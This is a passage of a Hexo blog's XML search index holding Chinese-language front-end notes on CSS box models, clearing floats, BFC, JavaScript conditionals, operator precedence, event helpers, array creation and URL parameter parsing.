https://www.cnblogs.com/chen-cong/p/7862832.htmlhttps://www.w3cplus.com/css/understanding-css-layout-block-formatting-context.html]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>BFC</tag>
        <tag>Block Formatting Context</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取网页屏幕可见区域高度]]></title>
    <url>%2Fblob%2F2019-01-08-get-the-height-of-the-visible-area-on-the-page-screen%2F</url>
    <content type="text"><![CDATA[document.body.clientWidth ==&gt; BODY对象宽度document.body.clientHeight ==&gt; BODY对象高度document.documentElement.clientWidth ==&gt; 可见区域宽度document.documentElement.clientHeight ==&gt; 可见区域高度 网页可见区域宽： document.body.clientWidth网页可见区域高： document.body.clientHeight网页可见区域宽： document.body.offsetWidth (包括边线的宽)网页可见区域高： document.body.offsetHeight (包括边线的高)网页正文全文宽： document.body.scrollWidth网页正文全文高： document.body.scrollHeight网页被卷去的高： document.body.scrollTop网页被卷去的左： document.body.scrollLeft网页正文部分上： window.screenTop网页正文部分左： window.screenLeft屏幕分辨率的高： window.screen.height屏幕分辨率的宽： window.screen.width屏幕可用工作区高度： window.screen.availHeight屏幕可用工作区宽度： window.screen.availWidth // 部分jQuery函数$(window).height() //浏览器时下窗口可视区域高度$(document).height() //浏览器时下窗口文档的高度$(document.body).height() //浏览器时下窗口文档body的高度$(document.body).outerHeight(true) //浏览器时下窗口文档body的总高度 包括border padding margin$(window).width() //浏览器时下窗口可视区域宽度$(document).width()//浏览器时下窗口文档对于象宽度$(document.body).width() //浏览器时下窗口文档body的高度$(document.body).outerWidth(true) //浏览器时下窗口文档body的总宽度 包括border padding HTML精确定位:scrollLeft,scrollWidth,clientWidth,offsetWidthscrollHeight: 获取对象的滚动高度。scrollLeft:设置或获取位于对象左边界和窗口中目前可见内容的最左端之间的距离scrollTop:设置或获取位于对象最顶端和窗口中可见内容的最顶端之间的距离scrollWidth:获取对象的滚动宽度offsetHeight:获取对象相对于版面或由父坐标 offsetParent 属性指定的父坐标的高度offsetLeft:获取对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置offsetTop:获取对象相对于版面或由 offsetTop 属性指定的父坐标的计算顶端位置event.clientX 相对文档的水平座标event.clientY 相对文档的垂直座标event.offsetX 相对容器的水平坐标event.offsetY 相对容器的垂直坐标document.documentElement.scrollTop 垂直方向滚动的值event.clientX+document.documentElement.scrollTop 相对文档的水平座标+垂直方向滚动的量]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>高度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS盒模型]]></title>
    <url>%2Fblob%2F2019-01-08-css-box-model%2F</url>
    <content type="text"><![CDATA[本文章将会从以下几个方面谈谈盒模型。 基本概念：标准模型 和IE模型 CSS如何设置这两种模型 JS如何设置获取盒模型对应的宽和高 实例题（根据盒模型解释边距重叠） BFC（边距重叠解决方案） 基本概念 盒模型（又称框模型、Box Model）的组成大家肯定都懂，由里向外content,padding,border,margin. 盒模型是有两种标准的，一个是标准盒模型，一个是IE盒模型。 从上面两图不难看出 在标准模型中，盒模型的宽高只是内容（content）的宽高，这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。 而在IE模型中盒模型的宽高是内容(content)+填充(padding)+边框(border)的总宽高。大多数情况下这使得我们更容易的去设定一个元素的宽高。 css如何设置两种模型 这里用到了CSS3 的属性 box-sizing 1234567891011121314151617181920212223 /* 标准模型 */box-sizing:content-box;/*IE模型*/box-sizing:border-box;/*从父元素继承 box-sizing 属性*/box-sizing:inherit;/*默认值*/box-sizing:initial;/* 支持 Firefox, Chrome, Safari, Opera, IE8+ 和老的Android浏览器 */.example &#123; /* Chrome 9-, Safari 5-, iOS 4.2-, Android 3-, Blackberry 7- */ -webkit-box-sizing: border-box; /* Firefox (desktop or Android) 28- */ -moz-box-sizing: border-box; /* Firefox 29+, IE 8+, Chrome 10+, Safari 5.1+, Opera 9.5+, iOS 5+, Opera Mini Anything, Blackberry 10+, Android 4+ */ box-sizing: border-box;&#125; 一些专家甚至建议所有的Web开发者们将所有的元素的box-sizing都设为border-box。 123456 html &#123; box-sizing: border-box;&#125;*, *:before, *:after &#123; box-sizing: inherit;&#125; JS获取宽高 通过JS获取盒模型对应的宽和高，有以下几种方法： 为了方便书写，以下用dom来表示获取的HTML的节点。 dom.style.width/height 这种方式只能取到dom元素内联样式所设置的宽高，也就是说如果该节点的样式是在style标签中或外联的CSS文件中设置的话，通过这种方法是获取不到dom的宽高的。 dom.currentStyle.width/height 这种方式获取的是在页面渲染完成后的结果，就是说不管是哪种方式设置的样式，都能获取到。 但这种方式只有IE浏览器支持。 window.getComputedStyle(dom).width/height 这种方式的原理和2是一样的，这个可以兼容更多的浏览器，通用性好一些。 dom.getBoundingClientRect().width/height 这种方式是根据元素在视窗中的绝对位置来获取宽高的 dom.offsetWidth/offsetHeight 这个就没什么好说的了，最常用的，也是兼容最好的。 垂直margin重叠 具体见 防止垂直margin重叠 模型画三角形 1234567891011121314151617 &lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;style&gt; .triangle &#123; width : 0; height: 0; border : 100px solid transparent; /*这里可以设置border的top、bottom、left、right四个方向的三角*/ border-top : 100px solid blue; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="triangle"&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 变种（可审查元素查看） 参考地址 https://www.cnblogs.com/chengzp/p/cssbox.htmlhttps://www.cnblogs.com/clearsky/p/5696286.html]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>盒模型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo文章目录样式调整]]></title>
    <url>%2Fblob%2F2019-01-08-hexo-article-catalog-style-adjustment%2F</url>
    <content type="text"><![CDATA[修改自定义样式文件 样式文件文件位于 1 themes/hexo/source/css/_common/components/sidebar/sidebar-toc.styl 文章目录默认展开 12 // 文章目录默认展开.post-toc .nav .nav-child &#123; display: block; &#125; 修改主题配置文件 主题配置文件位于 1 themes/hexo/_config.yml 每行目录超长自动换行 123 toc: enable: true wrap: true]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[写好 JS 条件语句的几条守则]]></title>
    <url>%2Fblob%2F2019-01-07-several-rules-for-writing-js-conditional-statements%2F</url>
    <content type="text"><![CDATA[英文：ecelyn Yeen 译文：眠云(杨涛)github.com/dawn-plex/translate/blob/master/articles/5-Tips-to-Write-Better-Conditionals-in-JavaScript.md在用 JavaScript 工作时，我们经常和条件语句打交道，这里有5条让你写出更好/干净的条件语句的建议。转载地址：https://mp.weixin.qq.com/s/0Dsvp-n8lTco930tvW4-1w 多重判断时使用 Array.includes 让我们看一下下面这个例子: 123456 // conditionfunction test(fruit) &#123; if (fruit == 'apple' || fruit == 'strawberry') &#123; console.log('red'); &#125;&#125; 第一眼，上面这个例子看起来没问题。如果我们有更多名字叫 cherry 和 cranberries 的红色水果呢？我们准备用更多的 || 来拓展条件语句吗？ 我们可以用 Array.includes (Array.includes)重写条件语句。 1234567 function test(fruit) &#123; const redFruits = ['apple', 'strawberry', 'cherry', 'cranberries']; if (redFruits.includes(fruit)) &#123; console.log('red'); &#125;&#125; 我们把红色的水果(red fruits)这一判断条件提取到一个数组。这样一来，代码看起来更整洁。 更少的嵌套，尽早 Return 让我们拓展上一个例子让它包含两个条件。 如果没有传入参数 fruit，抛出错误 接受 quantity 参数，并且在 quantity 大于 10 时打印出来 1234567891011121314151617181920212223 function test(fruit, quantity) &#123; const redFruits = ['apple', 'strawberry', 'cherry', 'cranberries']; // 条件 1: fruit 必须有值 if (fruit) &#123; // 条件 2: 必须是red的 if (redFruits.includes(fruit)) &#123; console.log('red'); // 条件 3: quantity大于10 if (quantity &gt; 10) &#123; console.log('big quantity'); &#125; &#125; &#125; else &#123; throw new Error('No fruit!'); &#125;&#125;// 测试结果test(null); // error: No fruitstest('apple'); // print: redtest('apple', 20); // print: red, big quantity 在上面的代码, 我们有: 1个 if/else 语句筛选出无效的语句 3层if嵌套语句 (条件 1, 2 &amp; 3) 我个人遵循的规则一般是在发现无效条件时，尽早Return。 123456789101112131415161718 /_ 当发现无效语句时，尽早Return _/function test(fruit, quantity) &#123; const redFruits = ['apple', 'strawberry', 'cherry', 'cranberries']; // 条件 1: 尽早抛出错误 if (!fruit) throw new Error('No fruit!'); // 条件 2: 必须是红色的 if (redFruits.includes(fruit)) &#123; console.log('red'); // 条件 3: 必须是大质量的 if (quantity &gt; 10) &#123; console.log('big quantity'); &#125; &#125;&#125; 这样一来，我们少了一层嵌套语句。这种编码风格非常好，尤其是当你有很长的if语句的时候(想象你需要滚动到最底层才知道还有else语句，这并不酷) 我们可以通过 倒置判断条件 &amp; 尽早return 进一步减少if嵌套。看下面我们是怎么处理判断 条件2 的: 1234567891011121314151617 /_ 当发现无效语句时，尽早Return _/function test(fruit, quantity) &#123; const redFruits = ['apple', 'strawberry', 'cherry', 'cranberries']; // 条件 1: 尽早抛出错误 if (!fruit) throw new Error('No fruit!'); // 条件 2: 当水果不是红色时停止继续执行 if (!redFruits.includes(fruit)) return; console.log('red'); // 条件 3: 必须是大质量的 if (quantity &gt; 10) &#123; console.log('big quantity'); &#125;&#125; 通过倒置判断条件2，我们的代码避免了嵌套语句。这个技巧在我们需要进行很长的逻辑判断时是非常有用的，特别是我们希望能够在条件不满足时能够停止下来进行处理。 而且这么做并不困难。问问自己，这个版本(没有嵌套)是不是比之前的(两层条件嵌套)更好，可读性更高？ 但对于我，我会保留先前的版本(包含两层嵌套)。这是因为: 代码比较短且直接，包含if嵌套的更清晰 倒置判断条件可能加重思考的负担(增加认知载荷) 因此，应当尽力减少嵌套和尽早return，但不要过度。如果你感兴趣的话，可以看一下关于这个话题的一篇文章和 StackOverflow 上的讨论。 Avoid Else, Return Early by Tim Oxley StackOverflow discussion on if/else coding style 使用默认参数和解构 我猜下面的代码你可能会熟悉，在JavaScript中我们总是需要检查 null / undefined的值和指定默认值: 1234567891011 function test(fruit, quantity) &#123; if (!fruit) return; // 如果 quantity 参数没有传入，设置默认值为 1 const q = quantity || 1; console.log(`We have $&#123;q&#125; $&#123;fruit&#125;!`);&#125;//test resultstest('banana'); // We have 1 banana!test('apple', 2); // We have 2 apple! 实际上，我们可以通过声明 默认函数参数 来消除变量 q。 123456789 function test(fruit, quantity = 1) &#123; // 如果 quantity 参数没有传入，设置默认值为 1 if (!fruit) return; console.log(`We have $&#123;quantity&#125; $&#123;fruit&#125;!`);&#125;//test resultstest('banana'); // We have 1 banana!test('apple', 2); // We have 2 apple! 这更加直观，不是吗？注意，每个声明都有自己的默认参数. 例如，我们也能给fruit分配默认值:function test(fruit = &#39;unknown&#39;, quantity = 1)。 如果fruit是一个object会怎么样？我们能分配一个默认参数吗？ 12345678910111213 function test(fruit) &#123; // 当值存在时打印 fruit 的值 if (fruit &amp;&amp; fruit.name) &#123; console.log (fruit.name); &#125; else &#123; console.log('unknown'); &#125;&#125;//test resultstest(undefined); // unknowntest(&#123; &#125;); // unknowntest(&#123; name: 'apple', color: 'red' &#125;); // apple 看上面这个例子，我们想打印 fruit 对象中可能存在的 name 属性。否则我们将打印unknown。我们可以通过默认参数以及解构从而避免判断条件 fruit &amp;&amp; fruit.name 12345678910 // 解构 - 仅仅获取 name 属性// 为其赋默认值为空对象function test(&#123;name&#125; = &#123;&#125;) &#123; console.log (name || 'unknown');&#125;// test resultstest(undefined); // unknowntest(&#123; &#125;); // unknowntest(&#123; name: 'apple', color: 'red' &#125;); // apple 由于我们只需要 name 属性，我们可以用 {name} 解构出参数，然后我们就能使用变量 name 代替 fruit.name。 我们也需要声明空对象 {} 作为默认值。如果我们不这么做，当执行 test(undefined) 时，你将得到一个无法对 undefined 或 null 解构的的错误。因为在 undefined 中没有 name 属性。 使用第三方库减少null的检查 如果你不介意使用第三方库，这有一些方式减少null的检查: 使用 Lodash get函数 使用Facebook开源的idx库(with Babeljs) 这是一个使用Lodash的例子: 123456789 function test(fruit) &#123; // 获取属性名，如果属性名不可用，赋默认值为 unknown console.log(__.get(fruit, 'name', 'unknown'); &#125;// test resultstest(undefined); // unknowntest(&#123; &#125;); // unknowntest(&#123; name: 'apple', color: 'red' &#125;); // apple 你可以在jsbin运行demo代码。除此之外，如果你是函数式编程的粉丝，你可能选择使用 Lodash fp，Lodash的函数式版本(方法变更为get或者getOr)。 倾向于对象遍历而不是Switch语句 让我们看下面这个例子，我们想根据 color 打印出水果: 1234567891011121314151617 function test(color) &#123; // 使用条件语句来寻找对应颜色的水果 switch (color) &#123; case 'red': return ['apple', 'strawberry']; case 'yellow': return ['banana', 'pineapple']; case 'purple': return ['grape', 'plum']; default: return []; &#125;&#125;// test resultstest(null); // []test('yellow'); // ['banana', 'pineapple'] 上面的代码看起来没有错误，但是我找到了一些累赘。用对象遍历实现相同的结果，语法看起来更简洁: 123456789 const fruitColor = &#123; red: ['apple', 'strawberry'], yellow: ['banana', 'pineapple'], purple: ['grape', 'plum']&#125;;function test(color) &#123; return fruitColor[color] || [];&#125; 或者你也可以使用 Map实现相同的结果: 12345678 const fruitColor = new Map() .set('red', ['apple', 'strawberry']) .set('yellow', ['banana', 'pineapple']) .set('purple', ['grape', 'plum']);function test(color) &#123; return fruitColor.get(color) || [];&#125; Map是一种在 ES2015 规范之后实现的对象类型，允许你存储 key 和 value 的值。 但我们是否应当禁止switch语句的使用呢？答案是不要限制你自己。从个人来说，我会尽可能的使用对象遍历，但我并不严格遵守它，而是使用对当前的场景更有意义的方式。 Todd Motto有一篇关于 switch 语句对比对象遍历的更深入的文章，你可以在这个地方阅读 重构语法 在上面的例子，我们能够用Array.filter 重构我们的代码，实现相同的效果。 123456789101112 const fruits = [ &#123; name: 'apple', color: 'red' &#125;, &#123; name: 'strawberry', color: 'red' &#125;, &#123; name: 'banana', color: 'yellow' &#125;, &#123; name: 'pineapple', color: 'yellow' &#125;, &#123; name: 'grape', color: 'purple' &#125;, &#123; name: 'plum', color: 'purple' &#125;];function test(color) &#123; return fruits.filter(f =&gt; f.color == color);&#125; 有着不止一种方法能够实现相同的结果，我们以上展示了 4 种。 对 所有/部分 判断使用Array.every &amp; Array.some 这最后一个建议更多是关于利用 JavaScript Array 的内置方法来减少代码行数。看下面的代码，我们想要检查是否所有水果都是红色: 1234567891011121314151617 const fruits = [ &#123; name: 'apple', color: 'red' &#125;, &#123; name: 'banana', color: 'yellow' &#125;, &#123; name: 'grape', color: 'purple' &#125; ];function test() &#123; let isAllRed = true; // 条件：所有水果都是红色 for (let f of fruits) &#123; if (!isAllRed) break; isAllRed = (f.color == 'red'); &#125; console.log(isAllRed); // false&#125; 代码那么长！我们可以通过 Array.every减少代码行数: 1234567891011 const fruits = [ &#123; name: 'apple', color: 'red' &#125;, &#123; name: 'banana', color: 'yellow' &#125;, &#123; name: 'grape', color: 'purple' &#125; ];function test() &#123; const isAllRed = fruits.every(f =&gt; f.color == 'red'); console.log(isAllRed); // false&#125; 现在更简洁了，不是吗？相同的方式，如果我们想测试是否存在红色的水果，我们可以使用 Array.some 一行代码实现。 123456789101112 const fruits = [ &#123; name: 'apple', color: 'red' &#125;, &#123; name: 'banana', color: 'yellow' &#125;, &#123; name: 'grape', color: 'purple' &#125;];function test() &#123; // 条件：任何一个水果是红色 const isAnyRed = fruits.some(f =&gt; f.color == 'red'); console.log(isAnyRed); // true&#125;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>条件语句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[清除浮动]]></title>
    <url>%2Fblob%2F2019-01-04-clear-float%2F</url>
    <content type="text"><![CDATA[浮动有四个属性值可以设置 left | right | inherit | none浮动元素会脱离文档流，不会继续停留在其父元素内。如果一个父元素只有一个子元素，那么它将会塌陷，就像是空的一样。 父级元素使用高度 因为浮动导致父元素高度塌陷，所以给父元素添加高度。 优点：简单、代码少、容易掌握 缺点：高度固定，如果两则皆不是固定高度，该方法不可用 建议：可以再少数固定高度的情况使用 css 12 .float-wraper&#123;height: 100px;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 123 &lt;div class="float-wraper"&gt; &lt;div class="float-inner"&gt;&lt;/div&gt;&lt;/div&gt; 父级元素使用 overflow:hidden（BFC） 使用时浏览器会自动检测浮动区域的高度，如果父元素本身有高度，且子元素高度超出父元素高度，则超出部分被隐藏。同时使用使用width或者zoom:1 来兼容IE6 IE7。 优点：简单、代码少、浏览器支持好 缺点：和子元素使用position、父元素使用height配合时，小心子元素超出部分被隐藏；用于body不生效 建议：子元素不要使用position，父元素不要使用height css 12 .float-wraper&#123;overflow: hidden; zoom: 1;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1 &lt;!-- 同上 --&gt; 父级元素使用 overflow:auto（BFC） 使用方法同上。 css 12 .float-wraper&#123;overflow: auto; zoom: 1;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1 &lt;!-- 同上 --&gt; Tips：这两种方法统计为：使用overflow属性，把它设置为非默认值visible的值（auto、hidden、overlay、scroll）。 overflow之所以能够有效是因为当它的值是非visible时会创建一个BFC，而BFC的一个特性就是包裹浮动元素。 父级元素使用 display:table（BFC） 将div 的display变成table，使父元素高度不会塌陷。 css 12 .float-wraper&#123;display: table;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1 &lt;!-- 同上 --&gt; 建议：不建议使用 父级元素使用 display:inlin-block（BFC） 将div 的display变成inlin-block，变成行内块元素后父元素高度不会塌陷。 *display 和*zoom为了兼容IE6 IE7 css 12 .float-wraper&#123;display: inline-block; *display: inline; *zoom: 1;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1 &lt;!-- 同上 --&gt; 缺点：无法使用margin: 0 auto;居中 父级元素也使用浮动（BFC） css 12 .float-wraper&#123;float: left;&#125;.float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1 &lt;!-- 同上 --&gt; 缺点：会产生新的浮动，要一直浮动到body 建议：只作为了解 父级元素使用 display:flow-root（BFC） 原理同overflow!=visible，生成一个块元素框，用于建立新的块格式化上下文。 缺点：兼容浏览器Firefox 53+、Chrome 58+、Opera 45+ css 12 .flow-root-wraper&#123;display: flow-root;&#125;.flow-root-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 123 &lt;div class="flow-root-wraper"&gt; &lt;div class="flow-root-inner"&gt;&lt;/div&gt;&lt;/div&gt; 可以通过@supports条件判断兼容Edge css 12345678 .flow-root-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125;.clearfix&#123; display: flow-root;&#125;@supports not (display:flow-root) &#123; .clearfix::after&#123;content:" "; display:block; clear:both; visibility:hidden; height:0&#125; .clearfix&#123;zoom:1&#125; &#125; 其他BFC属性和值 overflow: scroll | overlay display: inline-table | table-cell | table-caption | table-row | table-row-group | table-footer-group | table-header-group | flex | inline-flex | group | inline-group | flow-root contain: content | paint | layout position: absolute | fixed 结尾处添加空元素clear: both 在结尾处清除浮动 css 12 .float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125;.float-clear&#123;clear: both;&#125; html 1234 &lt;div class="float-wraper"&gt; &lt;div class="float-inner"&gt;&lt;/div&gt; &lt;div class="float-clear"&gt;&lt;/div&gt;&lt;/div&gt; 缺点：此方法需要在结尾添加一个节点，不够友好 结尾处添加br元素 clear=”both” br标签自带clear属性，原理和上一个方法一样，在结尾处清除浮动 css 1 .float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125; html 1234 &lt;div class="float-wraper"&gt; &lt;div class="float-inner"&gt;&lt;/div&gt; &lt;br clear="both"&gt;&lt;/div&gt; 缺点：此方法需要在结尾添加一个节点，不够友好 父级元素添加after和zoom-(主流) 添加一个有内容的伪元素，设置成块级元素，清除尾部的浮动，同时设置成不可见，保证不占用位置。 为了兼容IE6 IE7使用zoom，IE8以上和非IE浏览器才支持::after css 123 .float-inner&#123;float:left; width: 100px; height: 100px; background: #e2e2e2;&#125;.clearfix::after&#123;content:" "; display:block; clear:both; visibility:hidden; height:0&#125; .clearfix&#123;zoom:1&#125; html 123 &lt;div class="float-wraper clearfix"&gt; &lt;div class="float-inner"&gt;&lt;/div&gt;&lt;/div&gt; 优点：浏览器支持好、不容易出现怪问题 参考 https://www.w3cplus.com/css/how-floating-works.html]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>清除浮动</tag>
        <tag>both</tag>
        <tag>clearfix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运算符优先级]]></title>
    <url>%2Fblob%2F2019-01-04-operator-priority%2F</url>
    <content type="text"><![CDATA[首先是从一道 面试题 引发的思考 123456 var a = &#123;n: 1&#125;var b = a;a.x = a = &#123;n: 2&#125;console.log(a.x); // undefinedconsole.log(b.x); // &#123;n: 2&#125; 各种解释 MDN 知乎 试着去读如下代码 a&gt;b?a--:--a+b&gt;b+c?a==b&lt;c||a==c:(a+b)*a c=3 执行前a 执行前b 执行结果 执行后a 执行后b 2 6 7 1 6 6 2 6 5 2 0 6 -5 -1 6 优先级大小依次降低：()、–、*、+、&lt;、==、||、? : 运算符AST分析 分析地址1 分析地址2 分析这段代码a || b &amp;&amp; c || d Created with Raphaël 2.1.0ProgramExpressionStatementLogicalExpressionoperator: ||LogicalExpressionoperator: ||Identifiername: aLogicalExpressionoperator: &amp;&amp;Identifiername: bIdentifiername: cIdentifiername: d || 与 &amp;&amp; 的短路求值语义，如果左操作数已经足以求出结果则不会对右操作数求值。 常用操作符优先级 逗号、赋值、条件、逻辑或、逻辑与、相等、比较、算术、前置递减、后置递减、成员访问、小括号]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>运算符</tag>
        <tag>优先级</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事件的兼容写法]]></title>
    <url>%2Fblob%2F2019-01-04-compatible-writing-of-events%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324 const on = (function() &#123; if (document.addEventListener) &#123; return function(element, event, handler) &#123; element &amp;&amp; event &amp;&amp; handler &amp;&amp; element.addEventListener(event, handler, false); &#125;; &#125; else &#123; return function(element, event, handler) &#123; element &amp;&amp; event &amp;&amp; handler &amp;&amp; element.attachEvent('on' + event, handler); &#125;; &#125;&#125;)();const off = (function() &#123; if (document.removeEventListener) &#123; return function(element, event, handler) &#123; element &amp;&amp; event &amp;&amp; element.removeEventListener(event, handler, false); &#125;; &#125; else &#123; return function(element, event, handler) &#123; element &amp;&amp; event &amp;&amp; element.detachEvent('on' + event, handler); &#125;; &#125;&#125;)();]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数作用域（示例）]]></title>
    <url>%2Fblob%2F2019-01-04-function-scopes-(examples)%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829 function EE()&#123;console.log(this)&#125;EE(); // 全局作用域new EE(); // 局部作用域function FF()&#123;return function()&#123;console.log(this)&#125;&#125;FF()(); // 全局作用域new FF()(); // 全局作用域function GG()&#123;return &#123;a: function()&#123;console.log(this)&#125;&#125;&#125;GG().a(); // 局部作用域new GG().a(); // 局部作用域var hh = &#123; a: function()&#123;console.log(this);&#125;, ee0: function()&#123;EE();&#125;, ee: function()&#123;new EE();&#125;, ff0: function()&#123;FF()();&#125;, ff: function()&#123;new FF()();&#125;, ff1: FF(), gg: function()&#123;new GG().a()&#125;&#125;;hh.a(); // hh的局部作用域hh.ee0(); // 全局作用域hh.ee(); // ee的局部作用域hh.ff0(); // 全局作用域hh.ff(); // 全局作用域hh.ff1(); // hh的局部作用域 --- 从此解开谜底hh.gg(); // GG的局部作用域]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>作用域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建一个长度为10的数组]]></title>
    <url>%2Fblob%2F2019-01-04-create-an-array-of-10-lengths%2F</url>
    <content type="text"><![CDATA[创建一个长度为10的数组，并且每一个元素是该元素的下标 最简单方法 for循环 123456789 function arrayCreate(length)&#123; let arr = []; for(let i = 0 ; i &lt; length ; i++)&#123; arr[i] = i; &#125; return arr;&#125;let a1 = arrayCreate(10); Array.prototype.from() 方法从一个类数组或可迭代对象中创建一个新的数组示例。 Array(10) 创建一个只有长度的数组，这时候不能使用map方法，可以使用fill方法。 new Array(10) 同 Array(10)。 {length: 10} 类数组对象，且这是一个无值的对象。 Array.apply 实际使用的是Function.prototype.apply；第二个参数正常是一个数组，如果是类数组对象，就作为一个数组去处理。 Array.prototype.fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。 Array.prototype.keys() 方法返回一个新的Array迭代器，包含数组中每个索引的键。 ... 扩展运算符 Object.keys() 方法返回由一个给定对象的自身可枚举属性组成的数组 1234567891011121314151617181920212223242526 Array.from(&#123;length: 10&#125;, (v, k) =&gt; k);Array.from(Array(10).keys());Array.from(new Array(10).keys());Array.from(Array.apply(null, Array(10)).keys());Array.from(Array.apply(null, &#123;length: 10&#125;).keys());Array.from(Array(10).fill(1).keys());Array.from(Array.from(&#123;length: 10&#125;).keys());[...Array(10).keys()];[...new Array(10).keys()];[...Array.apply(null, Array(10)).keys()];[...Array.apply(null, &#123;length: 10&#125;).keys()];[...Array(10).fill(1).keys()];[...Array.from(&#123;length: 10&#125;).keys()];Object.keys(Array.apply(null, &#123;length:10&#125;)).map(key =&gt; +key);Object.keys(Array.from(&#123;length:10&#125;)).map(key =&gt; +key);Object.keys(String(Array(11))).map(key =&gt; +key);new Array(10).toString().split(",").map((v, i) =&gt; i);"".padStart(9, "-").split("-").map((v,k)=&gt;k);"".padEnd(9, "-").split("-").map((v,k)=&gt;k);"-".repeat("9").split("-").map((v,k)=&gt;k);]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>创建数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取url参数并保存为对象]]></title>
    <url>%2Fblob%2F2019-01-04-get-url-parameters-and-save-them-as-objects%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920 /** * 循环匹配一个?或者&amp; * 接着至少匹配一个非?或者非&amp; * 接着一个等号 * 接着至少匹配一个非?或者非&amp; * * 循环匹配后将key和value保存到一个对象中并返回，也可以保存在Map中 */function getQueryString(url)&#123; let params = &#123;&#125;; url.replace(/[\?\&amp;]([^\?\&amp;]+)=([^\?\&amp;]+)/g, function($0, $1, $2, $3)&#123; console.log($0, $1, $2) params[$1] = $2; &#125;); return params;&#125;// rungetQueryString("http://www.rongyi.com?a=1&amp;b=2&amp;c"); out 1 &#123;a: "1", b: "2"&#125;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>url</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多选与二进制数的互转]]></title>
    <url>%2Fblob%2F2019-01-04-mutual-selection-and-binary-number-conversion%2F</url>
    <content type="text"><![CDATA[[TOC] 任意一个正整数转换成几个正整数 转换后所有正整数相加的和等于这个正整数 123456789101112131415161718192021222324252627282930 /** * 转换为数组 * 如下： * 0 =&gt; [0] * 1 =&gt; [1] * 2 =&gt; [0, 2] * 3 =&gt; [1, 2] * 4 =&gt; [0, 0, 4] * 5 =&gt; [1, 0, 4] * 6 =&gt; [0, 2, 4] * * @param &#123;Integer&#125; num 数字 * @param &#123;Integer&#125; length 最小长度 * @param &#123;Integer&#125; defaultValue 默认值 * @return &#123;Array&#125; */function toArray(data, length = 0, defaultValue = 0)&#123; if(!data) return; const arr = Array.from(Array(length)).map(item =&gt; defaultValue); let temp = data.toString(2); cosnt l = temp.length; for (let i = 0; i &lt; l; i++) &#123; arr[l - i -1] = (temp.charAt(i) == "1") ? Math.pow(2, l - i - 1) : 0 &#125; return arr;&#125; 几个数相加产生一个不会重复的数 这几个数是2的n次方和0，n为自然数，任意几个数相加的和不在数列内 1234567891011121314151617181920 /** * 转化为数字 * 如下： * [0] =&gt; 0 * [1] =&gt; 1 * [0, 2] =&gt; 2 * [1, 2] =&gt; 3 * [0, 0, 4] =&gt; 4 * * @param &#123;Array&#125; arr * @return &#123;Integer&#125; 和 */function toNum(arr)&#123; if(!arr || arr.length &lt; 1) return 0; var temp = 0; for(var i in arr)&#123; temp += parseInt(arr[i]); &#125; return temp;&#125;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>对选</tag>
        <tag>二进制表示</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对象常用操作]]></title>
    <url>%2Fblob%2F2019-01-03-common-object-operations%2F</url>
    <content type="text"><![CDATA[删除对象属性 123 function deleteProperty(obj, key)&#123; obj.propertyIsEnumerable(key) &amp;&amp; (delete obj[key])&#125;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS实现水平居中、垂直居中的几种方式]]></title>
    <url>%2Fblob%2F2018-12-26-several-ways-of-realizing-horizontal-and-vertical-centralization-in-css%2F</url>
